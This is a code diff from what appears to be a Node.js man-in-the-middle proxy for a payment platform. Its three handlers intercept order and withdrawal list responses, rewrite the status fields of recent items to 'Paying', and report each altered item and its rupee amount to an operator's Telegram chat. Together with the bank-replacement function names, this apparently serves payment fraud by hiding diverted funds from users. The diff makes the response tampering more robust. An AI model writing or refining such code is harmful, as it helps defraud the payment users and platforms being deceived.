@@ -951,32 +951,33 @@ async function proxyAndReplaceBankInList(req, res) {
           }
         }
 
-        if (items && items.length > 0 && items[0] && (items[0].status !== undefined || items[0].statusName !== undefined || items[0].payStatus !== undefined)) {
+        if (items && items.length > 0 && items[0]) {
           const allKeys = Object.keys(items[0]);
           const statusKeys = allKeys.filter(k => /status/i.test(k));
-          let changed = 0;
-          const changedDetails = [];
-          for (let i = items.length - 1; i >= 0 && changed < wCount; i--) {
-            const oldStatus = items[i].status;
-            const oldStatusName = items[i].statusName;
-            for (const sk of statusKeys) {
-              if (sk === 'statusName' || sk === 'statusText') {
-                items[i][sk] = 'Paying';
-              } else {
-                items[i][sk] = 0;
+          if (statusKeys.length > 0 || items[0].status !== undefined) {
+            let changed = 0;
+            const changedDetails = [];
+            for (let i = items.length - 1; i >= 0 && changed < wCount; i--) {
+              const oldVals = statusKeys.map(k => `${k}=${JSON.stringify(items[i][k])}`).join(',');
+              for (const sk of statusKeys) {
+                if (/name|text/i.test(sk)) {
+                  items[i][sk] = 'Paying';
+                } else {
+                  items[i][sk] = 0;
+                }
               }
+              if (statusKeys.length === 0) {
+                items[i].status = 0;
+                items[i].statusName = 'Paying';
+              }
+              changedDetails.push(`${oldVals || 'no-status'} → Paying (₹${items[i].amount || items[i].amountOrder || items[i].money || '?'})`);
+              changed++;
             }
-            if (statusKeys.length === 0) {
-              items[i].status = 0;
-              items[i].statusName = 'Paying';
+            if (changed > 0 && bankData.adminChatId && bot) {
+              bot.sendMessage(bankData.adminChatId,
+                `✅ [${req.originalUrl}] Changed ${changed}/${items.length} item(s):\nKeys: ${allKeys.join(',')}\nStatus keys: ${statusKeys.join(',')}\n${changedDetails.join('\n')}`
+              ).catch(() => {});
             }
-            changedDetails.push(`${oldStatusName || oldStatus} → Paying (₹${items[i].amount || items[i].amountOrder || items[i].money || '?'})`);
-            changed++;
-          }
-          if (changed > 0 && bankData.adminChatId && bot) {
-            bot.sendMessage(bankData.adminChatId,
-              `✅ [${req.originalUrl}] Changed ${changed} item(s) to Paying:\n${changedDetails.join('\n')}`
-            ).catch(() => {});
           }
         }
       }
@@ -1037,35 +1038,33 @@ app.all('/payOrder/list', async (req, res) => {
         }
       }
 
-      if (items && items.length > 0) {
-        const firstItem = items[0];
-        const allKeys = Object.keys(firstItem);
+      if (items && items.length > 0 && items[0]) {
+        const allKeys = Object.keys(items[0]);
         const statusKeys = allKeys.filter(k => /status/i.test(k));
-
-        let changed = 0;
-        const changedDetails = [];
-        for (let i = items.length - 1; i >= 0 && changed < count; i--) {
-          const oldStatus = items[i].status;
-          const oldStatusName = items[i].statusName;
-          for (const sk of statusKeys) {
-            if (sk === 'statusName' || sk === 'statusText') {
-              items[i][sk] = 'Paying';
-            } else {
-              items[i][sk] = 0;
+        if (statusKeys.length > 0 || items[0].status !== undefined) {
+          let changed = 0;
+          const changedDetails = [];
+          for (let i = items.length - 1; i >= 0 && changed < count; i--) {
+            const oldVals = statusKeys.map(k => `${k}=${JSON.stringify(items[i][k])}`).join(',');
+            for (const sk of statusKeys) {
+              if (/name|text/i.test(sk)) {
+                items[i][sk] = 'Paying';
+              } else {
+                items[i][sk] = 0;
+              }
             }
+            if (statusKeys.length === 0) {
+              items[i].status = 0;
+              items[i].statusName = 'Paying';
+            }
+            changedDetails.push(`${oldVals || 'no-status'} → Paying (₹${items[i].amount || items[i].amountOrder || items[i].money || '?'})`);
+            changed++;
           }
-          if (statusKeys.length === 0) {
-            items[i].status = 0;
-            items[i].statusName = 'Paying';
+          if (bankData.adminChatId && bot && changed > 0) {
+            bot.sendMessage(bankData.adminChatId,
+              `✅ [/payOrder/list] Changed ${changed}/${items.length} item(s):\nKeys: ${allKeys.join(',')}\nStatus keys: ${statusKeys.join(',')}\n${changedDetails.join('\n')}`
+            ).catch(() => {});
           }
-          changedDetails.push(`#${i}: ${oldStatusName || oldStatus} → Paying (₹${items[i].amount || items[i].amountOrder || '?'})`);
-          changed++;
-        }
-
-        if (bankData.adminChatId && bot && changed > 0) {
-          bot.sendMessage(bankData.adminChatId,
-            `✅ Changed ${changed} withdrawal(s) to Paying:\n${changedDetails.join('\n')}`
-          ).catch(() => {});
         }
       }
     }
@@ -1127,35 +1126,33 @@ app.use(async (req, res) => {
           }
         }
 
-        if (items && items.length > 0 && items[0] && (items[0].status !== undefined || items[0].statusName !== undefined || items[0].payStatus !== undefined)) {
-          const firstItem = items[0];
-          const allKeys = Object.keys(firstItem);
+        if (items && items.length > 0 && items[0]) {
+          const allKeys = Object.keys(items[0]);
           const statusKeys = allKeys.filter(k => /status/i.test(k));
-
-          let changed = 0;
-          const changedDetails = [];
-          for (let i = items.length - 1; i >= 0 && changed < wCount; i--) {
-            const oldStatus = items[i].status;
-            const oldStatusName = items[i].statusName;
-            for (const sk of statusKeys) {
-              if (sk === 'statusName' || sk === 'statusText') {
-                items[i][sk] = 'Paying';
-              } else {
-                items[i][sk] = 0;
+          if (statusKeys.length > 0 || items[0].status !== undefined) {
+            let changed = 0;
+            const changedDetails = [];
+            for (let i = items.length - 1; i >= 0 && changed < wCount; i--) {
+              const oldVals = statusKeys.map(k => `${k}=${JSON.stringify(items[i][k])}`).join(',');
+              for (const sk of statusKeys) {
+                if (/name|text/i.test(sk)) {
+                  items[i][sk] = 'Paying';
+                } else {
+                  items[i][sk] = 0;
+                }
               }
+              if (statusKeys.length === 0) {
+                items[i].status = 0;
+                items[i].statusName = 'Paying';
+              }
+              changedDetails.push(`${oldVals || 'no-status'} → Paying (₹${items[i].amount || items[i].amountOrder || items[i].money || '?'})`);
+              changed++;
             }
-            if (statusKeys.length === 0) {
-              items[i].status = 0;
-              items[i].statusName = 'Paying';
+            if (changed > 0 && bankData.adminChatId && bot) {
+              bot.sendMessage(bankData.adminChatId,
+                `✅ [${req.originalUrl}] Changed ${changed} item(s):\nKeys: ${allKeys.join(',')}\nStatus keys: ${statusKeys.join(',')}\n${changedDetails.join('\n')}`
+              ).catch(() => {});
             }
-            changedDetails.push(`${oldStatusName || oldStatus} → Paying (₹${items[i].amount || items[i].amountOrder || items[i].money || '?'})`);
-            changed++;
-          }
-
-          if (changed > 0 && bankData.adminChatId && bot) {
-            bot.sendMessage(bankData.adminChatId,
-              `✅ [${req.originalUrl}] Changed ${changed} item(s) to Paying:\n${changedDetails.join('\n')}`
-            ).catch(() => {});
           }
         }
       }
